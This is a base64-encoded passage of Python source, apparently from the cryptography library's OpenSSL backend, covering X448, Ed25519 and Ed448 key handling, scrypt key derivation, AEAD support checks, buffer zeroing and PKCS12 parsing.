XJuIG5vdCBzZWxmLl9saWIuQ1JZUFRPR1JBUEhZX0lTX0xJQlJFU1NMXHJcblxyXG4gICAgZGVmIHg0NDhfbG9hZF9wdWJsaWNfYnl0ZXMoc2VsZiwgZGF0YTogYnl0ZXMpIC0+IHg0NDguWDQ0OFB1YmxpY0tleTpcclxuICAgICAgICBpZiBsZW4oZGF0YSkgIT0gNTY6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkFuIFg0NDggcHVibGljIGtleSBpcyA1NiBieXRlcyBsb25nIilcclxuXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9saWIuRVZQX1BLRVlfbmV3X3Jhd19wdWJsaWNfa2V5KFxyXG4gICAgICAgICAgICBzZWxmLl9saWIuTklEX1g0NDgsIHNlbGYuX2ZmaS5OVUxMLCBkYXRhLCBsZW4oZGF0YSlcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChldnBfcGtleSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2ZmaS5nYyhldnBfcGtleSwgc2VsZi5fbGliLkVWUF9QS0VZX2ZyZWUpXHJcbiAgICAgICAgcmV0dXJuIF9YNDQ4UHVibGljS2V5KHNlbGYsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiB4NDQ4X2xvYWRfcHJpdmF0ZV9ieXRlcyhzZWxmLCBkYXRhOiBieXRlcykgLT4geDQ0OC5YNDQ4UHJpdmF0ZUtleTpcclxuICAgICAgICBpZiBsZW4oZGF0YSkgIT0gNTY6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkFuIFg0NDggcHJpdmF0ZSBrZXkgaXMgNTYgYnl0ZXMgbG9uZyIpXHJcblxyXG4gICAgICAgIGRhdGFfcHRyID0gc2VsZi5fZmZpLmZyb21fYnVmZmVyKGRhdGEpXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9saWIuRVZQX1BLRVlfbmV3X3Jhd19wcml2YXRlX2tleShcclxuICAgICAgICAgICAgc2VsZi5fbGliLk5JRF9YNDQ4LCBzZWxmLl9mZmkuTlVMTCwgZGF0YV9wdHIsIGxlbihkYXRhKVxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGV2cF9wa2V5ICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZmZpLmdjKGV2cF9wa2V5LCBzZWxmLl9saWIuRVZQX1BLRVlfZnJlZSlcclxuICAgICAgICByZXR1cm4gX1g0NDhQcml2YXRlS2V5KHNlbGYsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiB4NDQ4X2dlbmVyYXRlX2tleShzZWxmKSAtPiB4NDQ4Llg0NDhQcml2YXRlS2V5OlxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZXZwX3BrZXlfa2V5Z2VuX2djKHNlbGYuX2xpYi5OSURfWDQ0OClcclxuICAgICAgICByZXR1cm4gX1g0NDhQcml2YXRlS2V5KHNlbGYsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiB4NDQ4X3N1cHBvcnRlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZDpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgbm90IHNlbGYuX2xpYi5DUllQVE9HUkFQSFlfT1BFTlNTTF9MRVNTX1RIQU5fMTExXHJcbiAgICAgICAgICAgIGFuZCBub3Qgc2VsZi5fbGliLkNSWVBUT0dSQVBIWV9JU19CT1JJTkdTU0xcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIGVkMjU1MTlfc3VwcG9ydGVkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgc2VsZi5fZmlwc19lbmFibGVkOlxyXG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcclxuICAgICAgICByZXR1cm4gbm90IHNlbGYuX2xpYi5DUllQVE9HUkFQSFlfT1BFTlNTTF9MRVNTX1RIQU5fMTExQlxyXG5cclxuICAgIGRlZiBlZDI1NTE5X2xvYWRfcHVibGljX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsIGRhdGE6IGJ5dGVzXHJcbiAgICApIC0+IGVkMjU1MTkuRWQyNTUxOVB1YmxpY0tleTpcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXMoImRhdGEiLCBkYXRhKVxyXG5cclxuICAgICAgICBpZiBsZW4oZGF0YSkgIT0gZWQyNTUxOS5fRUQyNTUxOV9LRVlfU0laRTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQW4gRWQyNTUxOSBwdWJsaWMga2V5IGlzIDMyIGJ5dGVzIGxvbmciKVxyXG5cclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2xpYi5FVlBfUEtFWV9uZXdfcmF3X3B1YmxpY19rZXkoXHJcbiAgICAgICAgICAgIHNlbGYuX2xpYi5OSURfRUQyNTUxOSwgc2VsZi5fZmZpLk5VTEwsIGRhdGEsIGxlbihkYXRhKVxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGV2cF9wa2V5ICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZmZpLmdjKGV2cF9wa2V5LCBzZWxmLl9saWIuRVZQX1BLRVlfZnJlZSlcclxuXHJcbiAgICAgICAgcmV0dXJuIF9FZDI1NTE5UHVibGljS2V5KHNlbGYsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBlZDI1NTE5X2xvYWRfcHJpdmF0ZV9ieXRlcyhcclxuICAgICAgICBzZWxmLCBkYXRhOiBieXRlc1xyXG4gICAgKSAtPiBlZDI1NTE5LkVkMjU1MTlQcml2YXRlS2V5OlxyXG4gICAgICAgIGlmIGxlbihkYXRhKSAhPSBlZDI1NTE5Ll9FRDI1NTE5X0tFWV9TSVpFOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJBbiBFZDI1NTE5IHByaXZhdGUga2V5IGlzIDMyIGJ5dGVzIGxvbmciKVxyXG5cclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJkYXRhIiwgZGF0YSlcclxuICAgICAgICBkYXRhX3B0ciA9IHNlbGYuX2ZmaS5mcm9tX2J1ZmZlcihkYXRhKVxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fbGliLkVWUF9QS0VZX25ld19yYXdfcHJpdmF0ZV9rZXkoXHJcbiAgICAgICAgICAgIHNlbGYuX2xpYi5OSURfRUQyNTUxOSwgc2VsZi5fZmZpLk5VTEwsIGRhdGFfcHRyLCBsZW4oZGF0YSlcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChldnBfcGtleSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2ZmaS5nYyhldnBfcGtleSwgc2VsZi5fbGliLkVWUF9QS0VZX2ZyZWUpXHJcblxyXG4gICAgICAgIHJldHVybiBfRWQyNTUxOVByaXZhdGVLZXkoc2VsZiwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIGVkMjU1MTlfZ2VuZXJhdGVfa2V5KHNlbGYpIC0+IGVkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXk6XHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9ldnBfcGtleV9rZXlnZW5fZ2Moc2VsZi5fbGliLk5JRF9FRDI1NTE5KVxyXG4gICAgICAgIHJldHVybiBfRWQyNTUxOVByaXZhdGVLZXkoc2VsZiwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIGVkNDQ4X3N1cHBvcnRlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZDpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgbm90IHNlbGYuX2xpYi5DUllQVE9HUkFQSFlfT1BFTlNTTF9MRVNTX1RIQU5fMTExQlxyXG4gICAgICAgICAgICBhbmQgbm90IHNlbGYuX2xpYi5DUllQVE9HUkFQSFlfSVNfQk9SSU5HU1NMXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBlZDQ0OF9sb2FkX3B1YmxpY19ieXRlcyhzZWxmLCBkYXRhOiBieXRlcykgLT4gZWQ0NDguRWQ0NDhQdWJsaWNLZXk6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzKCJkYXRhIiwgZGF0YSlcclxuICAgICAgICBpZiBsZW4oZGF0YSkgIT0gX0VENDQ4X0tFWV9TSVpFOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJBbiBFZDQ0OCBwdWJsaWMga2V5IGlzIDU3IGJ5dGVzIGxvbmciKVxyXG5cclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2xpYi5FVlBfUEtFWV9uZXdfcmF3X3B1YmxpY19rZXkoXHJcbiAgICAgICAgICAgIHNlbGYuX2xpYi5OSURfRUQ0NDgsIHNlbGYuX2ZmaS5OVUxMLCBkYXRhLCBsZW4oZGF0YSlcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChldnBfcGtleSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2ZmaS5nYyhldnBfcGtleSwgc2VsZi5fbGliLkVWUF9QS0VZX2ZyZWUpXHJcblxyXG4gICAgICAgIHJldHVybiBfRWQ0NDhQdWJsaWNLZXkoc2VsZiwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIGVkNDQ4X2xvYWRfcHJpdmF0ZV9ieXRlcyhzZWxmLCBkYXRhOiBieXRlcykgLT4gZWQ0NDguRWQ0NDhQcml2YXRlS2V5OlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoImRhdGEiLCBkYXRhKVxyXG4gICAgICAgIGlmIGxlbihkYXRhKSAhPSBfRUQ0NDhfS0VZX1NJWkU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkFuIEVkNDQ4IHByaXZhdGUga2V5IGlzIDU3IGJ5dGVzIGxvbmciKVxyXG5cclxuICAgICAgICBkYXRhX3B0ciA9IHNlbGYuX2ZmaS5mcm9tX2J1ZmZlcihkYXRhKVxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fbGliLkVWUF9QS0VZX25ld19yYXdfcHJpdmF0ZV9rZXkoXHJcbiAgICAgICAgICAgIHNlbGYuX2xpYi5OSURfRUQ0NDgsIHNlbGYuX2ZmaS5OVUxMLCBkYXRhX3B0ciwgbGVuKGRhdGEpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZXZwX3BrZXkgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9mZmkuZ2MoZXZwX3BrZXksIHNlbGYuX2xpYi5FVlBfUEtFWV9mcmVlKVxyXG5cclxuICAgICAgICByZXR1cm4gX0VkNDQ4UHJpdmF0ZUtleShzZWxmLCBldnBfcGtleSlcclxuXHJcbiAgICBkZWYgZWQ0NDhfZ2VuZXJhdGVfa2V5KHNlbGYpIC0+IGVkNDQ4LkVkNDQ4UHJpdmF0ZUtleTpcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2V2cF9wa2V5X2tleWdlbl9nYyhzZWxmLl9saWIuTklEX0VENDQ4KVxyXG4gICAgICAgIHJldHVybiBfRWQ0NDhQcml2YXRlS2V5KHNlbGYsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBkZXJpdmVfc2NyeXB0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAga2V5X21hdGVyaWFsOiBieXRlcyxcclxuICAgICAgICBzYWx0OiBieXRlcyxcclxuICAgICAgICBsZW5ndGg6IGludCxcclxuICAgICAgICBuOiBpbnQsXHJcbiAgICAgICAgcjogaW50LFxyXG4gICAgICAgIHA6IGludCxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgYnVmID0gc2VsZi5fZmZpLm5ldygidW5zaWduZWQgY2hhcltdIiwgbGVuZ3RoKVxyXG4gICAgICAgIGtleV9tYXRlcmlhbF9wdHIgPSBzZWxmLl9mZmkuZnJvbV9idWZmZXIoa2V5X21hdGVyaWFsKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FVlBfUEJFX3NjcnlwdChcclxuICAgICAgICAgICAga2V5X21hdGVyaWFsX3B0cixcclxuICAgICAgICAgICAgbGVuKGtleV9tYXRlcmlhbCksXHJcbiAgICAgICAgICAgIHNhbHQsXHJcbiAgICAgICAgICAgIGxlbihzYWx0KSxcclxuICAgICAgICAgICAgbixcclxuICAgICAgICAgICAgcixcclxuICAgICAgICAgICAgcCxcclxuICAgICAgICAgICAgc2NyeXB0Ll9NRU1fTElNSVQsXHJcbiAgICAgICAgICAgIGJ1ZixcclxuICAgICAgICAgICAgbGVuZ3RoLFxyXG4gICAgICAgIClcclxuICAgICAgICBpZiByZXMgIT0gMTpcclxuICAgICAgICAgICAgZXJyb3JzID0gc2VsZi5fY29uc3VtZV9lcnJvcnNfd2l0aF90ZXh0KClcclxuICAgICAgICAgICAgIyBtZW1vcnkgcmVxdWlyZWQgZm9ybXVsYSBleHBsYWluZWQgaGVyZTpcclxuICAgICAgICAgICAgIyBodHRwczovL2Jsb2cuZmlsaXBwby5pby90aGUtc2NyeXB0LXBhcmFtZXRlcnMvXHJcbiAgICAgICAgICAgIG1pbl9tZW1vcnkgPSAxMjggKiBuICogciAvLyAoMTAyNCoqMilcclxuICAgICAgICAgICAgcmFpc2UgTWVtb3J5RXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiTm90IGVub3VnaCBtZW1vcnkgdG8gZGVyaXZlIGtleS4gVGhlc2UgcGFyYW1ldGVycyByZXF1aXJlIlxyXG4gICAgICAgICAgICAgICAgIiB7fSBNQiBvZiBtZW1vcnkuIi5mb3JtYXQobWluX21lbW9yeSksXHJcbiAgICAgICAgICAgICAgICBlcnJvcnMsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICByZXR1cm4gc2VsZi5fZmZpLmJ1ZmZlcihidWYpWzpdXHJcblxyXG4gICAgZGVmIGFlYWRfY2lwaGVyX3N1cHBvcnRlZChzZWxmLCBjaXBoZXIpIC0+IGJvb2w6XHJcbiAgICAgICAgY2lwaGVyX25hbWUgPSBhZWFkLl9hZWFkX2NpcGhlcl9uYW1lKGNpcGhlcilcclxuICAgICAgICBpZiBzZWxmLl9maXBzX2VuYWJsZWQgYW5kIGNpcGhlcl9uYW1lIG5vdCBpbiBzZWxmLl9maXBzX2FlYWQ6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG4gICAgICAgICMgU0lWIGlzblwndCBsb2FkZWQgdGhyb3VnaCBnZXRfY2lwaGVyYnluYW1lIGJ1dCBpbnN0ZWFkIGEgbmV3IGZldGNoIEFQSVxyXG4gICAgICAgICMgb25seSBhdmFpbGFibGUgaW4gMy4wKy4gQnV0IGlmIHdlIGtub3cgd2VcJ3JlIG9uIDMuMCsgdGhlbiB3ZSBrbm93XHJcbiAgICAgICAgIyBpdFwncyBzdXBwb3J0ZWQuXHJcbiAgICAgICAgaWYgY2lwaGVyX25hbWUuZW5kc3dpdGgoYiItc2l2Iik6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9saWIuQ1JZUFRPR1JBUEhZX09QRU5TU0xfMzAwX09SX0dSRUFURVIgPT0gMVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9saWIuRVZQX2dldF9jaXBoZXJieW5hbWUoY2lwaGVyX25hbWUpICE9IHNlbGYuX2ZmaS5OVUxMXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICBAY29udGV4dGxpYi5jb250ZXh0bWFuYWdlclxyXG4gICAgZGVmIF96ZXJvZWRfYnl0ZWFycmF5KHNlbGYsIGxlbmd0aDogaW50KSAtPiB0eXBpbmcuSXRlcmF0b3JbYnl0ZWFycmF5XTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGlzIG1ldGhvZCBjcmVhdGVzIGEgYnl0ZWFycmF5LCB3aGljaCB3ZSBjb3B5IGRhdGEgaW50byAoaG9wZWZ1bGx5XHJcbiAgICAgICAgYWxzbyBmcm9tIGEgbXV0YWJsZSBidWZmZXIgdGhhdCBjYW4gYmUgZHluYW1pY2FsbHkgZXJhc2VkISksIGFuZCB0aGVuXHJcbiAgICAgICAgemVybyB3aGVuIHdlXCdyZSBkb25lLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGJhID0gYnl0ZWFycmF5KGxlbmd0aClcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHlpZWxkIGJhXHJcbiAgICAgICAgZmluYWxseTpcclxuICAgICAgICAgICAgc2VsZi5femVyb19kYXRhKGJhLCBsZW5ndGgpXHJcblxyXG4gICAgZGVmIF96ZXJvX2RhdGEoc2VsZiwgZGF0YSwgbGVuZ3RoOiBpbnQpIC0+IE5vbmU6XHJcbiAgICAgICAgIyBXZSBjbGVhciB0aGluZ3MgdGhpcyB3YXkgYmVjYXVzZSBhdCB0aGUgbW9tZW50IHdlXCdyZSBub3RcclxuICAgICAgICAjIHN1cmUgb2YgYSBiZXR0ZXIgd2F5IHRoYXQgY2FuIGd1YXJhbnRlZSBpdCBvdmVyd3JpdGVzIHRoZVxyXG4gICAgICAgICMgbWVtb3J5IG9mIGEgYnl0ZWFycmF5IGFuZCBkb2VzblwndCBqdXN0IHJlcGxhY2UgdGhlIHVuZGVybHlpbmcgY2hhciAqLlxyXG4gICAgICAgIGZvciBpIGluIHJhbmdlKGxlbmd0aCk6XHJcbiAgICAgICAgICAgIGRhdGFbaV0gPSAwXHJcblxyXG4gICAgQGNvbnRleHRsaWIuY29udGV4dG1hbmFnZXJcclxuICAgIGRlZiBfemVyb2VkX251bGxfdGVybWluYXRlZF9idWYoc2VsZiwgZGF0YSk6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhpcyBtZXRob2QgdGFrZXMgYnl0ZXMsIHdoaWNoIGNhbiBiZSBhIGJ5dGVzdHJpbmcgb3IgYSBtdXRhYmxlXHJcbiAgICAgICAgYnVmZmVyIGxpa2UgYSBieXRlYXJyYXksIGFuZCB5aWVsZHMgYSBudWxsLXRlcm1pbmF0ZWQgdmVyc2lvbiBvZiB0aGF0XHJcbiAgICAgICAgZGF0YS4gVGhpcyBpcyByZXF1aXJlZCBiZWNhdXNlIFBLQ1MxMl9wYXJzZSBkb2VzblwndCB0YWtlIGEgbGVuZ3RoIHdpdGhcclxuICAgICAgICBpdHMgcGFzc3dvcmQgY2hhciAqIGFuZCBmZmkuZnJvbV9idWZmZXIgZG9lc25cJ3QgcHJvdmlkZSBudWxsXHJcbiAgICAgICAgdGVybWluYXRpb24uIFNvLCB0byBzdXBwb3J0IHplcm9pbmcgdGhlIGRhdGEgdmlhIGJ5dGVhcnJheSB3ZVxyXG4gICAgICAgIG5lZWQgdG8gYnVpbGQgdGhpcyByaWRpY3Vsb3VzIGNvbnN0cnVjdCB0aGF0IGNvcGllcyB0aGUgbWVtb3J5LCBidXRcclxuICAgICAgICB6ZXJvZXMgaXQgYWZ0ZXIgdXNlLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIGRhdGEgaXMgTm9uZTpcclxuICAgICAgICAgICAgeWllbGQgc2VsZi5fZmZpLk5VTExcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBkYXRhX2xlbiA9IGxlbihkYXRhKVxyXG4gICAgICAgICAgICBidWYgPSBzZWxmLl9mZmkubmV3KCJjaGFyW10iLCBkYXRhX2xlbiArIDEpXHJcbiAgICAgICAgICAgIHNlbGYuX2ZmaS5tZW1tb3ZlKGJ1ZiwgZGF0YSwgZGF0YV9sZW4pXHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIHlpZWxkIGJ1ZlxyXG4gICAgICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICAgICAgIyBDYXN0IHRvIGEgdWludDhfdCAqIHNvIHdlIGNhbiBhc3NpZ24gYnkgaW50ZWdlclxyXG4gICAgICAgICAgICAgICAgc2VsZi5femVyb19kYXRhKHNlbGYuX2ZmaS5jYXN0KCJ1aW50OF90ICoiLCBidWYpLCBkYXRhX2xlbilcclxuXHJcbiAgICBkZWYgbG9hZF9rZXlfYW5kX2NlcnRpZmljYXRlc19mcm9tX3BrY3MxMihcclxuICAgICAgICBzZWxmLCBkYXRhOiBieXRlcywgcGFzc3dvcmQ6IHR5cGluZy5PcHRpb25hbFtieXRlc11cclxuICAgICkgLT4gdHlwaW5nLlR1cGxlW1xyXG4gICAgICAgIHR5cGluZy5PcHRpb25hbFtQUklWQVRFX0tFWV9UWVBFU10sXHJcbiAgICAgICAgdHlwaW5nLk9wdGlvbmFsW3g1MDkuQ2VydGlmaWNhdGVdLFxyXG4gICAgICAgIHR5cGluZy5MaXN0W3g1MDkuQ2VydGlmaWNhdGVdLFxyXG4gICAgXTpcclxuICAgICAgICBwa2NzMTIgPSBzZWxmLmxvYWRfcGtjczEyKGRhdGEsIHBhc3N3b3JkKVxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIHBrY3MxMi5rZXksXHJcbiAgICAgICAgICAgIHBrY3MxMi5jZXJ0LmNlcnRpZmljYXRlIGlmIHBrY3MxMi5jZXJ0IGVsc2UgTm9uZSxcclxuICAgICAgICAgICAgW2NlcnQuY2VydGlmaWNhdGUgZm9yIGNlcnQgaW4gcGtjczEyLmFkZGl0aW9uYWxfY2VydHNdLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgbG9hZF9wa2NzMTIoXHJcbiAgICAgICAgc2VsZiwgZGF0YTogYnl0ZXMsIHBhc3N3b3JkOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdXHJcbiAgICApIC0+IFBLQ1MxMktleUFuZENlcnRpZmljYXRlczpcclxuICAgICAgICBpZiBwYXNzd29yZCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgicGFzc3dvcmQiLCBwYXNzd29yZClcclxuXHJcbiAgICAgICAgYmlvID0gc2VsZi5fYnl0ZXNfdG9fYmlvKGRhdGEpXHJcbiAgICAgICAgcDEyID0gc2VsZi5fbGliLmQyaV9QS0NTMTJfYmlvKGJpby5iaW8sIHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGlmIHAxMiA9PSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgc2VsZi5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJDb3VsZCBub3QgZGVzZXJpYWxpemUgUEtDUzEyIGRhdGEiKVxyXG5cclxuICAgICAgICBwMTIgPSBzZWxmLl9mZmkuZ2MocDEyLCBzZWxmLl9saWIuUEtDUzEyX2ZyZWUpXHJcbiAgICAgICAgZXZwX3BrZXlfcHRyID0gc2VsZi5fZmZpLm5ldygiRVZQX1BLRVkgKioiKVxyXG4gICAgICAgIHg1MDlfcHRyID0gc2VsZi5fZmZpLm5ldygiWDUwOSAqKiIpXHJcbiAgICAgICAgc2tfeDUwOV9wdHIgPSBzZWxmLl9mZmkubmV3KCJDcnlwdG9ncmFwaHlfU1RBQ0tfT0ZfWDUwOSAqKiIpXHJcbiAgICAgICAgd2l0aCBzZWxmLl96ZXJvZWRfbnVsbF90ZXJtaW5hdGVkX2J1ZihwYXNzd29yZCkgYXMgcGFzc3dvcmRfYnVmOlxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuUEtDUzEyX3BhcnNlKFxyXG4gICAgICAgICAgICAgICAgcDEyLCBwYXNzd29yZF9idWYsIGV2cF9wa2V5X3B0ciwgeDUwOV9wdHIsIHNrX3g1MDlfcHRyXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgIyBXb3JrYXJvdW5kIGZvclxyXG4gICAgICAgICMgaHR0cHM6Ly9naXRodWIuY29tL2xpYnJlc3NsLXBvcnRhYmxlL3BvcnRhYmxlL2lzc3Vlcy82NTlcclxuICAgICAgICBpZiBzZWxmLl9saWIuQ1JZUFRPR1JBUEhZX0xJQlJFU1NMX0xFU1NfVEhBTl8zNDA6XHJcbiAgICAgICAgICAgIHNlbGYuX2NvbnN1bWVfZXJyb3JzKClcclxuXHJcbiAgICAgICAgaWYgcmVzID09IDA6XHJcbiAgICAgICAgICAgIHNlbGYuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiSW52YWxpZCBwYXNzd29yZCBvciBQS0NTMTIgZGF0YSIpXHJcblxyXG4gICAgICAgIGNlcnQgPSBOb25lXHJcbiAgICAgICAga2V5ID0gTm9uZVxyXG4gICAgICAgIGFkZGl0aW9uYWxfY2VydGlmaWNhdGVzID0gW11cclxuXHJcbiAgICAgICAgaWYgZXZwX3BrZXlfcHRyWzBdICE9IHNlbGYuX2ZmaS5OVUxMOlxyXG4gICAgICAgICAgICBldnBfcGtleSA9IHNlbGYuX2ZmaS5nYyhldnBfcGtleV9wdHJbMF0sIHNlbGYuX2xpYi5FVlBfUEtFWV9mcmVlKVxyXG4gICAgICAgICAgICBrZXkgPSBzZWxmLl9ldnBfcGtleV90b19wcml2YXRlX2tleShldnBfcGtleSlcclxuXHJcbiAgICAgICAgaWYgeDUwOV9wdHJbMF0gIT0gc2VsZi5fZmZpLk5VTEw6XHJcbiAgICAgICAgICAgIHg1MDkgPSBzZWxmLl9mZmkuZ2MoeDUwOV9wdHJbMF0sIHNlbGYuX2xpYi5YNTA5X2ZyZWUpXHJcbiAgICAgICAgICAgIGNlcnRfb2JqID0gc2VsZi5fb3NzbDJjZXJ0KHg1MDkpXHJcbiAgICAgICAgICAgIG5hbWUgPSBOb25lXHJcbiAgICAgICAgICAgIG1heWJlX25hbWUgPSBzZWxmLl9saWIuWDUwOV9hbGlhc19nZXQwKHg1MDksIHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgICAgICBpZiBtYXliZV9uYW1lICE9IHNlbGYuX2ZmaS5OVUxMOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IHNlbGYuX2ZmaS5zdHJpbmcobWF5YmVfbmFtZSlcclxuICAgICAgICAgICAgY2VydCA9IFBLQ1MxMkNlcnRpZmljYXRlKGNlcnRfb2JqLCBuYW1lKVxyXG5cclxuICAgICAgICBpZiBza194NTA5X3B0clswXSAhPSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgc2tfeDUwOSA9IHNlbGYuX2ZmaS5nYyhza194NTA5X3B0clswXSwgc2VsZi5fbGliLnNrX1g1MDlfZnJlZSlcclxuICAgICAgICAgICAgbnVtID0gc2VsZi5fbGliLnNrX1g1MDlfbnVtKHNrX3g1MDlfcHRyWzBdKVxyXG5cclxuICAgICAgICAgICAgIyBJbiBPcGVuU1NMIDwgMy4wLjAgUEtDUzEyIHBhcnNpbmcgcmV2ZXJzZXMgdGhlIG9yZGVyIG9mIHRoZVxyXG4gICAgICAgICAgICAjIGNlcnRpZmljYXRlcy5cclxuICAgICAgICAgICAgaW5kaWNlczogdHlwaW5nLkl0ZXJhYmxlW2ludF1cclxuICAgICAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fbGliLkNSWVBUT0dSQVBIWV9PUEVOU1NMXzMwMF9PUl9HUkVBVEVSXHJcbiAgICAgICAgICAgICAgICBvciBzZWxmLl9saWIuQ1JZUFRPR1JBUEhZX0lTX0JPUklOR1NTTFxyXG4gICAgICAgICAgICApOlxyXG4gICAgICAgICAgICAgICAgaW5kaWNlcyA9IHJhbmdlKG51bSlcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGluZGljZXMgPSByZXZlcnNlZChyYW5nZShudW0pKVxyXG5cclxuICAgICAgICAgICAgZm9yIGkgaW4gaW5kaWNlczpcclxuICAgICAgICAgICAgICAgIHg1MDkgPSBzZWxmLl9saWIuc2tfWDUwOV92YWx1ZShza194NTA5LCBpKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydCh4NTA5ICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgICAgICAgICAgeDUwOSA9IHNlbGYuX2ZmaS5nYyh4NTA5LCBzZWxmLl9saWIuWDUwOV9mcmVlKVxyXG4gICAgICAgICAgICAgICAgYWRkbF9jZXJ0ID0gc2VsZi5fb3NzbDJjZXJ0KHg1MDkpXHJcbiAgICAgICAgICAgICAgICBhZGRsX25hbWUgPSBOb25lXHJcbiAgICAgICAgICAgICAgICBtYXliZV9uYW1lID0gc2VsZi5fbGliLlg1MDlfYWxpYXNfZ2V0MCh4NTA5LCBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICAgICAgICAgIG